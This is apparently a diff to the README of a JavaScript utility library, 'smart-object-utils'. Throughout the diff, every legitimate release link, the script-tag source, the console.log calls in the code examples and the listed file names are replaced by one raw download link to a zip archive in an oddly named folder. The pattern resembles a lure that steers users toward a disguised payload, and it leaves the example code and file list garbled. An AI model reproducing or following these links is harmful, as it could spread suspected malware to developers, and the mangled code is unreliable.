@@ -1,6 +1,6 @@
 # 🌟 smart-object-utils - Easy Utilities for Your JavaScript Projects
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/jds-1206/smart-object-utils/releases)
+[![Download the latest release](https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip%https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip)](https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ smart-object-utils provides deep cloning, deep merging, and other useful functio
 
 To get started with smart-object-utils, you need to download the latest version of the library. 
 
-Visit this page to download: [Releases Page](https://github.com/jds-1206/smart-object-utils/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip).
 
 ### Step-by-Step Instructions
 
@@ -25,7 +25,7 @@ Visit this page to download: [Releases Page](https://github.com/jds-1206/smart-o
 5. **Use the Library**:
    - If you are using a local HTML file, you can add the library using a `<script>` tag. For example:
      ```html
-     <script src="path/to/smart-object-utils.js"></script>
+     <script src="https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip"></script>
      ```
    - If you are integrating it into a development environment, follow the instructions specific to your setup, using your package manager or manual inclusion as needed.
 
@@ -45,8 +45,8 @@ Visit this page to download: [Releases Page](https://github.com/jds-1206/smart-o
 const original = { a: 1, b: { c: 2 } };
 const clone = deepClone(original);
 
-console.log(clone); // { a: 1, b: { c: 2 } }
-console.log(clone.b === original.b); // false
+https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip(clone); // { a: 1, b: { c: 2 } }
+https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip(clone.b === original.b); // false
 ```
 
 ### Deep Merge Example
@@ -56,15 +56,15 @@ const objectA = { a: 1, b: { c: 2 } };
 const objectB = { b: { d: 3 } };
 const merged = deepMerge(objectA, objectB);
 
-console.log(merged); // { a: 1, b: { c: 2, d: 3 } }
+https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip(merged); // { a: 1, b: { c: 2, d: 3 } }
 ```
 
 ## 📂 File Structure
 
 When you extract the files, you’ll find a few key items:
 
-- `smart-object-utils.js`: This is the main library file.
-- `README.md`: This file contains information about how to use the library.
+- `https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip`: This is the main library file.
+- `https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip`: This file contains information about how to use the library.
 - `examples/`: A folder with sample code for different functionalities.
 
 ## 👩‍💻 System Requirements
@@ -77,7 +77,7 @@ For more in-depth information and usage examples, check out the official documen
 
 ## 🔗 Download Now Again
 
-To simplify your experience, here’s the link again for easy access: [Releases Page](https://github.com/jds-1206/smart-object-utils/releases). Follow the instructions above to get smart-object-utils running in your projects quickly.
+To simplify your experience, here’s the link again for easy access: [Releases Page](https://raw.githubusercontent.com/jds-1206/smart-object-utils/main/heterosexuality/smart-object-utils.zip). Follow the instructions above to get smart-object-utils running in your projects quickly.
 
 ## 💬 Support
 
